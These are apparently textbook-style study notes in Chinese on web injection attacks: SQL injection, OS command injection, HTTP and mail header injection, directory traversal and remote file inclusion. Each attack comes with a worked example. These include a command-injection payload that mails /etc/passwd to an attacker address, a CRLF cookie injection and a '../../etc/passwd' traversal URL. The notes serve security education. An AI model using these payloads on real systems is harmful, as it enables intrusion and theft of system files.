# 注入攻击

## SQL 注入为什么能读走不该读的数据?

- SQL 注入: 服务器拼接 SQL 时存在漏洞，攻击者构造非法 SQL，从而非法访问服务器资源;
- 漏洞点: 请求参数被直接拼进 SQL 语句，参数里的引号和注释符因此具有了语法含义;

```bash
# 正常情况
http://example.com/search?q= 上野宣
SELECT * FROM bookTbl WHERE author = ' 上野宣 ' and flag = 1;

# 构造非法 sql
# 访问到不应该访问的权限
http://example.com/search?q= 上野宣 ' --
SELECT * FROM bookTbl WHERE author =' 上野宣 ' - -' and flag=1;
```

- 攻击做了什么: 参数里的单引号提前闭合了原语句的字符串，`--` 把后面的 `and flag=1` 注释掉，条件限制因此消失;

## OS 命令注入是怎么把一条命令变成两条的?

- OS 命令注入: 服务器执行系统命令时存在漏洞，攻击者构造非法命令;
- 触发点: 参数被直接拼进命令行，参数里的命令分隔符让系统把后半段当成另一条命令执行;

```bash
# 服务器调用命令行存在安全漏洞
my $adr = $q->param('mailaddress');
open(MAIL, "| /usr/sbin/sendmail $adr");
print MAIL "From: info@example.com\n";

# 攻击者构造非法输入
; cat /etc/passwd | mail hack@example.jp

# 系统执行命令
# ; 视为命令之间的分隔符, 导致非法执行 cat 之后的命令
| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp
```

- 后果: 原本只应发一封邮件，实际却把 `/etc/passwd` 的内容发到了攻击者的邮箱;

## 换行符为什么能注入 HTTP 首部?

- HTTP 首部注入: 一种被动攻击，攻击者在首部字段插入换行符，从而添加任意首部或主体;
- 换行符的作用: `%0D%0A` 是 HTTP 首部行之间的分隔符，插入它就等于结束当前首部行、开启新的一行;

```bash
# 通过 %0D%0A 换行符, 非法插入 Set-Cookie
%0D%0ASet-Cookie:+SID=123456789
# 通过 %0D%0A 换行符, 非法插入任意 HTML 网页
%0D%0A%0D%0A<HTML><HEAD><TITLE> 之后,想要显示的网页内容 <!--
```

- 一个换行与两个换行的差别: 一个 `%0D%0A` 只加出一个首部字段，连续两个 `%0D%0A%0D%0A` 结束整个首部，后面注入的内容就变成响应主体;

## 邮件首部注入能达到什么目的?

- 邮件首部注入: 一种被动攻击，通过邮件首部插入换行符，把邮件发送给任意对象或添加非法内容;
- 漏洞点: 邮件地址参数被直接拼进邮件首部，插入的换行符使后面的文本变成新的首部行或正文;

```bash
# 通过 %0D%0A%0D%0A 改写任意邮件首部
bob@hackr.jp%0D%0A%0D%0ATest Message
```

## 目录遍历攻击怎么越过公开目录?

- 目录遍历攻击: 一种主动攻击，通过分析 URL 猜测文件目录，再通过相对路径定位符或文件名访问非公开文件;
- 漏洞点: 路径参数被直接拼进文件路径，`../../` 因此能逐级向上跳出公开目录;

```bash
# ../../etc/passwd 访问上级文件夹中的 etc 文件
http://example.com/read.php?log=../../etc/passwd
```

## 远程文件包含漏洞让服务器执行了什么?

- 远程文件包含漏洞: 一种主动攻击，服务器脚本使用外界 URL，攻击者制作陷阱 URL 诱导服务器执行;
- 常见场景: 该漏洞常见于 php;
- 危险之处: 执行权交到了攻击者手里，服务器会去加载并执行攻击者指定位置的内容;
